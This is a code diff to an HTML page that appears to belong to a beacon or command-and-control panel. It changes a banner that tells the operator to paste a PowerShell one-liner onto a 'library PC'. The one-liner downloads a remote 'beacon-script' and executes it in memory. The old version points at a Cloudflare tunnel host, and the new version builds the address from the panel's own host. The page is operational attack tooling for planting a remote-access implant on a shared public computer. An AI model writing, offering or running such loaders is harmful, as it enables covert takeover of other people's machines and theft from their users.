@@ -184,7 +184,13 @@
 <body>
   <div id="oneliner-banner">
     <h3>🪟 PowerShell One-Liner — Paste on library PC:</h3>
-    <code id="oneliner-code">iex (iwr -Uri https://score-blocked-integrate-early.trycloudflare.com/beacon-script).Content</code>
+    <code id="oneliner-code">iex (iwr -Uri " + scheme + "://" + host + "/beacon-script).Content</code>
+    <script>
+      const host = window.location.host;
+      const scheme = window.location.protocol === 'https:' ? 'https' : 'http';
+      document.getElementById('oneliner-code').textContent =
+        "iex (iwr -Uri " + scheme + "://" + host + "/beacon-script).Content";
+    </script>
   </div>
   <div class="header">
     <div class="header-title">
